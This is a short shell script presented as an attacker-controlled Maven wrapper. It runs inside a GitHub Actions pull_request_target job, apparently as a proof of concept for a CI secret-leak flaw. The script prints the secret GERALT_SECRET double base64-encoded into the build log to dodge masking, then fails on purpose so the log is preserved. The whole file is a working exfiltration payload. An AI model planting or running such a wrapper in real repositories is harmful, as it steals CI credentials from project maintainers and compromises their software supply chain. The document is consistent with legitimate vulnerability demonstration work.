#!/bin/sh
# Attacker-controlled Maven wrapper executed by the integration-tests job
# (`./mvnw -B -Dquickly clean install`) in a pull_request_target context.
echo "GERALT_DBG attacker-controlled mvnw executed: actor=${GITHUB_ACTOR:-?} event=${GITHUB_EVENT_NAME:-?}"
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
# Terminate with a failure so the runner preserves the leaked-token logs.
exit 1
